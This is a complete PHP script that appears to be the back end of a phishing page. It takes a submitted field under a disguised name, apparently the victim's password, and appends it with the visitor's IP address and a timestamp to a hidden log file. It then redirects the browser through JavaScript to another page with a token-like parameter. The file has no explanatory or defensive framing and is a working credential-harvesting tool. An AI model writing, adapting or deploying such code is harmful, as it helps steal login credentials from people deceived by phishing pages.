<?php
$file = "asin_____2021______asin";

$kata_mutiara = $_POST['kata_mutiara'];

$ip = $_SERVER['REMOTE_ADDR'];

$today = date("F j, Y, g:i a");



$handle = fopen($file, 'a');

fwrite($handle, "________________________________________*");

fwrite($handle, "\n");

fwrite($handle, "|PS|---> : ");

fwrite($handle, "$kata_mutiara");

fwrite($handle, "\n");

fwrite($handle, "|IP|---> : ");

fwrite($handle, "$ip");

fwrite($handle, "\n");

fwrite($handle, "|DT|---> : ");

fwrite($handle, "$today");

fwrite($handle, "\n");

fwrite($handle, "________________________________________*");

fwrite($handle, "\n");

fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"climax1.html?waves=FREE6PKS63Y5EZ2XS3AREWAVES\";

// -->

</script>";

?>